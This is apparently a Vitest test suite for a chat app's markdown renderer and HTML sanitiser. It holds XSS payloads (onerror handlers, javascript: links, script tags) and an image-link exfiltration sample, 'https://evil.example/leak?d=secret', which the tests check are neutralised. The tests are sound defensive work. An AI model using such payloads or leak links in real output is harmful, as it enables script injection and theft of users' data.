// @vitest-environment jsdom
// happy-dom drops <pre> inside DOMPurify, so the sanitiser runs against jsdom here
import DOMPurify from "dompurify";
import { describe, expect, it } from "vitest";
import MarkdownIt, { type MarkdownIt as MarkdownItInstance } from "markdown-it";
import { renderMarkdown, resourceLinks, sanitizeHtml } from "./markdown";

describe("renderMarkdown", () => {
  it("drops raw HTML and script URLs", () => {
    const html = renderMarkdown('<img src=x onerror="alert(1)"> [otter](javascript:alert(1)) <script>bad()</script>');
    expect(html).not.toContain("<img");
    expect(html).not.toContain("<script");
    expect(html).not.toContain('href="javascript');
  });

  it("turns resource URIs into resource links, in text, links and inline code", () => {
    const html = renderMarkdown("See burrow://2, [the den](note://5) and `photo://den.png`.");
    expect(html).toContain('data-ai-resource="burrow://2"');
    expect(html).toContain('data-ai-resource="note://5"');
    expect(html).toContain('data-ai-resource="photo://den.png"');
    expect(html).not.toContain('data-ai-resource="burrow://2,"');
    expect(html).not.toContain('href="burrow://');
  });

  it("opens web links in a new tab and leaves them out of resources", () => {
    const html = renderMarkdown("Visit https://otters.example/dens today");
    expect(html).toContain('href="https://otters.example/dens"');
    expect(html).toContain('target="_blank"');
    expect(html).not.toContain("data-ai-resource");
  });

  it("keeps code blocks as text", () => {
    const html = renderMarkdown("```go\nfmt.Println(\"<b>badger</b>\")\n```");
    expect(html).toContain('data-lang="go"');
    expect(html).toContain("&lt;b&gt;badger&lt;/b&gt;");
  });

  it("keeps custom code rendering when resource links augment an app renderer", () => {
    const md: MarkdownItInstance = new MarkdownIt({ highlight: (code): string => `<span class="syntax">${md.utils.escapeHtml(code)}</span>` }).use(resourceLinks);
    const html = md.render("See `note://9`.\n\n```python\nprint('otter')\n```");
    expect(html).toContain('data-ai-resource="note://9"');
    expect(html).toContain('class="syntax"');
    expect(html).toContain("print('otter')");
  });

  it("renders markdown images as links so the browser fetches nothing", () => {
    const html = renderMarkdown("![chat](https://evil.example/leak?d=secret) and ![den](attachment://p1)");
    expect(html).not.toContain("<img");
    expect(html).toContain('href="https://evil.example/leak?d=secret"');
    expect(html).toContain(">chat</a>");
    expect(html).toContain('data-ai-resource="attachment://p1"');
  });
});

describe("sanitizeHtml", () => {
  it("keeps MathML and SVG and drops scripts and handlers", () => {
    const html = sanitizeHtml('<math><mi>x</mi></math><svg viewBox="0 0 4 4"><path d="M0 0h4"/></svg><img src=x onerror="dig()"><script>dig()</script>');
    expect(html).toContain("<math>");
    expect(html).toContain("<svg");
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("<script");
  });

  it("drops remote sources from custom renderer output and keeps local ones", () => {
    const html = sanitizeHtml(
      '<img src="https://evil.example/a.png"><img src="//evil.example/b.png"><img src="/uploads/c.png"><img src="data:image/png;base64,AA=="><img srcset="/uploads/d.png 1x, https://evil.example/d.png 2x"><video poster="https://evil.example/e.png"></video><svg><image href="https://evil.example/f.png"/></svg><p style="background:url(https://evil.example/g.png)">otter</p><a href="https://otters.example/">den</a>',
    );
    expect(html).not.toContain("evil.example");
    expect(html).toContain('src="/uploads/c.png"');
    expect(html).toContain('src="data:image/png;base64,AA=="');
    expect(html).toContain('href="https://otters.example/"');
  });

  it("leaves the app's own DOMPurify untouched", () => {
    sanitizeHtml("<p>otter</p>");
    expect(DOMPurify.sanitize('<img src="https://otters.example/a.png">')).toContain("otters.example");
  });
});
